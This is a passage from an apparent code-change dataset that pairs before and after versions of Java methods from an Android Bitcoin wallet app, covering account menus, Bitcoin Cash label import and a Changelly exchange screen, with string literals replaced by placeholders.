  coluCreate.setOnClickListener(createColuAccount);
  _progress=new ProgressDialog(this);
  hdBchCreate.setVisibility(BCHHelper.isModulePaired(getApplicationContext()) ? View.VISIBLE : View.GONE);
}"
91056,"@Override public void onCreate(Bundle savedInstanceState){
  this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
  super.onCreate(savedInstanceState);
  setContentView(R.layout.add_advanced_account_activity);
  ButterKnife.bind(this);
  final Activity activity=AddAdvancedAccountActivity.this;
  _mbwManager=MbwManager.getInstance(this);
  _network=_mbwManager.getNetwork();
  findViewById(R.id.btScan).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      ScanActivity.callMe(activity,SCAN_RESULT_CODE,StringHandleConfig.returnKeyOrAddressOrHdNode());
    }
  }
);
  findViewById(R.id.btGenerateNewSingleKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Intent intent=new Intent(activity,CreateKeyActivity.class);
      startActivityForResult(intent,CREATE_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btTrezor).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      TrezorAccountImportActivity.callMe(activity,TREZOR_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyTrezor).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_TREZOR_LINK);
    }
  }
);
  findViewById(R.id.btKeepKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      KeepKeyAccountImportActivity.callMe(activity,KEEPKEY_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyKeepKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_KEEPKEY_LINK);
    }
  }
);
  findViewById(R.id.btLedger).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      LedgerAccountImportActivity.callMe(activity,LEDGER_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyLedger).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_LEDGER_LINK);
    }
  }
);
}","@Override public void onCreate(Bundle savedInstanceState){
  this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
  super.onCreate(savedInstanceState);
  setContentView(R.layout.add_advanced_account_activity);
  ButterKnife.bind(this);
  final Activity activity=AddAdvancedAccountActivity.this;
  _mbwManager=MbwManager.getInstance(this);
  _network=_mbwManager.getNetwork();
  findViewById(R.id.btScan).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      ScanActivity.callMe(activity,SCAN_RESULT_CODE,StringHandleConfig.returnKeyOrAddressOrHdNode());
    }
  }
);
  findViewById(R.id.btGenerateNewSingleKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Intent intent=new Intent(activity,CreateKeyActivity.class);
      startActivityForResult(intent,CREATE_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btTrezor).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      TrezorAccountImportActivity.callMe(activity,TREZOR_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyTrezor).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_TREZOR_LINK);
    }
  }
);
  findViewById(R.id.btKeepKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      KeepKeyAccountImportActivity.callMe(activity,KEEPKEY_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyKeepKey).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_KEEPKEY_LINK);
    }
  }
);
  findViewById(R.id.btLedger).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      LedgerAccountImportActivity.callMe(activity,LEDGER_RESULT_CODE);
    }
  }
);
  findViewById(R.id.btBuyLedger).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      Utils.openWebsite(activity,BUY_LEDGER_LINK);
    }
  }
);
  btGenerateNewBchSingleKey.setVisibility(BCHHelper.isModulePaired(getApplicationContext()) ? View.VISIBLE : View.GONE);
}"
91057,"public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}","public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=getBitcoinCashAccountId(walletAccount);
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}"
91058,"private void updateIncludingMenus(){
  WalletAccount account=accountListAdapter.getFocusedAccount();
  boolean isBch=account.getType() == WalletAccount.Type.BCHSINGLEADDRESS || account.getType() == WalletAccount.Type.BCHBIP44;
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed() && !isBch) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)&& !isBch) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive() && !isBch) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount) && !isBch) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount && !isBch) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& AccountManager.INSTANCE.getBTCMasterSeedAccounts().size() > 1 && !isBch) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    menus.add(R.menu.record_options_menu_ignore_warning);
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  AppCompatActivity parent=(AppCompatActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miIgnoreWarnings) {
        ignoreSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (accountListAdapter.getFocusedAccount() != null) {
        accountListAdapter.setFocusedAccount(null);
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  accountListAdapter.setFocusedAccount(account);
  update();
}","private void updateIncludingMenus(){
  WalletAccount account=accountListAdapter.getFocusedAccount();
  boolean isBch=account.getType() == WalletAccount.Type.BCHSINGLEADDRESS || account.getType() == WalletAccount.Type.BCHBIP44;
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed() && !isBch) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)&& !isBch) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive() && !isBch) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount) && !isBch) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.getType() != WalletAccount.Type.BCHBIP44 && account.getType() != WalletAccount.Type.BCHSINGLEADDRESS && account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount && !isBch) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& AccountManager.INSTANCE.getBTCMasterSeedAccounts().size() > 1 && !isBch) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    menus.add(R.menu.record_options_menu_ignore_warning);
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  AppCompatActivity parent=(AppCompatActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miIgnoreWarnings) {
        ignoreSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (accountListAdapter.getFocusedAccount() != null) {
        accountListAdapter.setFocusedAccount(null);
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  accountListAdapter.setFocusedAccount(account);
  update();
}"
91059,"private void updateUi(){
  try {
    exchangeFiatRate.setText(Utils.formatFiatWithUnit(mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())))));
  }
 catch (  NumberFormatException ignore) {
  }
  exchangeFiatRate.setVisibility(View.VISIBLE);
  exchangeRate.setText(""String_Node_Str"" + CurrencyValue.fromValue(ExactBitcoinCashValue.ONE,""String_Node_Str"",mbwManager.getExchangeRateManager()));
  exchangeRate.setVisibility(View.VISIBLE);
}","private void updateUi(){
  try {
    CurrencyValue currencyValue=mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())));
    if (currencyValue != null && currencyValue.getValue() != null) {
      exchangeFiatRate.setText(Utils.formatFiatWithUnit(currencyValue));
      exchangeFiatRate.setVisibility(View.VISIBLE);
    }
 else {
      exchangeFiatRate.setVisibility(View.GONE);
    }
  }
 catch (  NumberFormatException ignore) {
  }
}"
91060,"@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
Toast.makeText(getActivity(),""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}","@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(amount / fromAmount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(fromAmount / amount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
new AlertDialog.Builder(getActivity()).setMessage(getString(R.string.exchange_rate_unavailable_msg)).setNegativeButton(R.string.button_cancel,null).setPositiveButton(R.string.try_again,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialogInterface,int i){
BigDecimal val=new BigDecimal(fromValue.getText().toString());
requestOfferFunction(val.toPlainString(),ChangellyService.BCH,ChangellyService.BTC);
}
}
).show();
break;
}
}"
91061,"private String getPaymentUri(){
  String prefix=accountDisplayStrategy.getLabel() + ""String_Node_Str"";
  final StringBuilder uri=new StringBuilder(prefix);
  uri.append(getBitcoinAddress());
  if (!CurrencyValue.isNullOrZero(_amount)) {
    if (accountDisplayType == AccountDisplayType.COLU_ACCOUNT) {
      uri.append(""String_Node_Str"").append(_amount.getValue().toPlainString());
    }
 else {
      uri.append(""String_Node_Str"").append(CoinUtil.valueString(getDefaultCurrencyAmount().getValue(),_mbwManager.getBitcoinDenomination(),false));
    }
  }
  return uri.toString();
}","private String getPaymentUri(){
  String prefix=accountDisplayStrategy.getLabel() + ""String_Node_Str"";
  final StringBuilder uri=new StringBuilder(prefix);
  uri.append(getBitcoinAddress());
  if (!CurrencyValue.isNullOrZero(_amount)) {
    if (accountDisplayType == AccountDisplayType.COLU_ACCOUNT) {
      uri.append(""String_Node_Str"").append(_amount.getValue().toPlainString());
    }
 else {
      uri.append(""String_Node_Str"").append(CoinUtil.valueString(getDefaultCurrencyAmount().getValue(),CoinUtil.Denomination.BTC,false));
    }
  }
  return uri.toString();
}"
91062,"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  MbwManager mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  List<WalletAccount> toAccounts=new ArrayList<>();
  toAccounts.addAll(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  toAccounts.addAll(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  toAccounts.addAll(AccountManager.INSTANCE.getCoinapultAccounts().values());
  accountAdapter=new AccountAdapter(mbwManager,toAccounts,firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}","@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setTheme(ExchangeActivity.theme);
  setContentView(R.layout.changelly_activity);
  setTitle(getString(R.string.exchange_altcoins_to_btc));
  ButterKnife.bind(this);
  MbwManager mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  List<WalletAccount> toAccounts=new ArrayList<>();
  toAccounts.addAll(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  toAccounts.addAll(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  toAccounts.addAll(AccountManager.INSTANCE.getCoinapultAccounts().values());
  accountAdapter=new AccountAdapter(mbwManager,toAccounts,firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}"
91063,"@Override public void done(){
  currencySelector.setVisibility(View.VISIBLE);
  accountSelector.setVisibility(View.VISIBLE);
  titleView.setVisibility(View.VISIBLE);
  subtitleView.setVisibility(View.VISIBLE);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
}","@Override public void done(){
  titleView.setVisibility(View.VISIBLE);
  subtitleView.setVisibility(View.VISIBLE);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
}"
91064,"@OnClick(R.id.toLayout) void clickToValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setEntry(toValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
}","@OnClick(R.id.toLayout) void clickToValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setEntry(toValue.getText().toString());
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
  llChangellyMain.post(new Runnable(){
    @Override public void run(){
      llChangellyMain.smoothScrollTo(0,toLayout.getTop());
    }
  }
);
}"
91065,"@OnClick(R.id.fromLayout) void clickFromValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setEntry(fromValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
}","@OnClick(R.id.fromLayout) void clickFromValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setEntry(fromValue.getText().toString());
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  llChangellyMain.post(new Runnable(){
    @Override public void run(){
      llChangellyMain.smoothScrollTo(0,fromLayout.getTop());
    }
  }
);
}"
91066,"protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_offer_activity);
  ButterKnife.bind(this);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  createOffer();
}","protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setTheme(ExchangeActivity.theme);
  setContentView(R.layout.changelly_offer_activity);
  setTitle(getString(R.string.exchange_altcoins_to_btc));
  ButterKnife.bind(this);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  createOffer();
}"
91067,"private void updateUI(){
  tvFromAmount.setText(getString(R.string.value_currency,offer.currencyFrom,offer.amountFrom));
  tvSendToAddress.setText(offer.payinAddress);
}","private void updateUI(){
  tvFromAmount.setText(getString(R.string.value_currency,offer.currencyFrom,Constants.decimalFormat.format(offer.amountFrom)));
